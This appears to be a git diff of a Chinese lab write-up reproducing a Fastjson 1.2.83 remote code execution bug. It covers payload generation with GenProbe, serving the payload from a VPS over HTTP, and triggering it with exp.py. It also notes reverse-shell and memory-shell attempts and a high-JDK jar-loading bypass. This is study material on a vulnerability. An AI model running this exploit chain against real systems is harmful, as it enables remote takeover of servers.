@@ -37,11 +37,12 @@ tags:
 参考：https://www.cnblogs.com/9eek/p/21793398
 
 ## 四、漏洞复现：
-### 1、环境部署
+### Windows环境下弹计算器
+#### 1、环境部署
 这里直接用开源好的工具即可
 靶场：https://github.com/charis3306/Fastjson1.2.83-vul
 poc：https://github.com/0x7eTeam/fastjson-1.2.83-rce
-#### 1.1、JDK8RCE靶场环境部署
+##### 1.1、JDK8RCE靶场环境部署
 a、由于漏洞成型的特殊要求，需要满足：目标为fastjson1.2.83+SpringBoot项目+FartJar打包
 靶场漏洞代码可参考：
 https://github.com/charis3306/Fastjson1.2.83-vul
@@ -54,7 +55,7 @@ java -jar  E:\Fastjson1.2.83-vul-main\target\fastjson-login-rce-1.0.0.jar
 ![](images/Pasted%20image%2020260924000200.png)
 
 
-#### 1.2、POC环境部署
+##### 1.2、POC环境部署
 git 拉去poc项目
 git clon https://github.com/0x7eTeam/fastjson-1.2.83-rce.git
 这里简单介绍下：
@@ -63,8 +64,8 @@ lib目录下是我们需要生成poc所需要的依赖，包括ams和fastjson的
 GenProbe.jar主要是用于生成poc，直接做成文件更方便生成payload
 ![](images/Pasted%20image%2020260923231937.png)
 www目录主要用于将最终的poc放置并开启临时服务器，用于靶场进行远程访问
-### 2、复现
-#### a、编译GenProbe.java文件
+#### 2、复现
+##### a、编译GenProbe.java文件
 ![](images/Pasted%20image%2020260923232436.png)
 ```shell
 javac -cp "poc/lib/*" -d poc poc/GenProbe.java
@@ -77,7 +78,7 @@ poc/GenProbe.java：要编译的 Java 源代码文件
 
 ```
 
-#### b、生成预期的poc
+##### b、生成预期的poc
 这里我们将poc放到vps的19090端口服务上，所以传递给GenProbe的参数，应该为vps开启服务的ip、端口
 靶机是windows，命令为calc.exe
 生成的payload，这里由于他的检查机制
@@ -98,13 +99,13 @@ java -cp "poc:poc/lib/asm-9.6.jar:poc/lib/fastjson-1.2.83.jar" GenProbe 192.168.
     2. `19090` → 端口
     3. `"open -a Calculator"` → 要执行的系统命令（macOS 打开计算器；Linux 是`calc`，Windows 是`calc.exe`
 ```
-#### c、启动服务
+##### c、启动服务
 ```
 cd poc/www && python3 -m http.server 19090
 ```
 ![](images/Pasted%20image%2020260923234416.png)
 
-#### d、验证
+##### d、验证
 	1、可以通过vps上的poc里面的exp.py文件进行，比较方便
 	`python3 poc/exp.py -u 靶机服务漏洞端口地址 -poc http://192.168.0.100:19090/probe（vps的服务地址）'
 	2、靶机上抓包，篡改
@@ -197,6 +198,47 @@ public class GenProbe {
 ok，windows弹窗计算器了
 ![](images/Pasted%20image%2020260924002803.png)
 
+
+
+### Linux环境实现rce
+目标靶场：好靶场
+![](images/Pasted%20image%2020261004142245.png)
+实现：1、反弹shell；2、内存马
+1、反弹shell-失败，这里这个靶场有点问题，不能反弹，放置挺长时间会连接上，不稳定
+
+![](images/Pasted%20image%2020261004142919.png)
+
+![](images/Pasted%20image%2020261004143037.png)
+
+、![](images/Pasted%20image%2020261004143049.png)
+
+![](images/Pasted%20image%2020261004143106.png)
+
+![](images/Pasted%20image%2020261004143339.png)
+
+![](images/Pasted%20image%2020261004143427.png)
+采用思路二：木马链接
+
+
+
 ### 3、踩坑
 
+## 五、针对高版本jdk
+针对高版本jdk，由于不再信任远程加载的jar文件，不回去执行加载这个类，所以需要手动去除发。这个时候需要去通过两步操作；1、远程加载jar；2、利用fd加载恶意类
+使用该工具：
+生成poc后，在漏洞点参考上述jdk8的方式，先让漏洞点远程加载jar，再通过fd进行喷洒，执行本地中的恶意类，实现rce
+
+![](images/Pasted%20image%2020261004143740.png)
+
+![](images/Pasted%20image%2020261004143807.png)
+
+
+![](images/Pasted%20image%2020261004143944.png)
+
+![](images/Pasted%20image%2020261004143952.png)
+
+
+![](images/Pasted%20image%2020261004144007.png)
+
+![](images/Pasted%20image%2020261004144041.png)
 漏洞代码审计
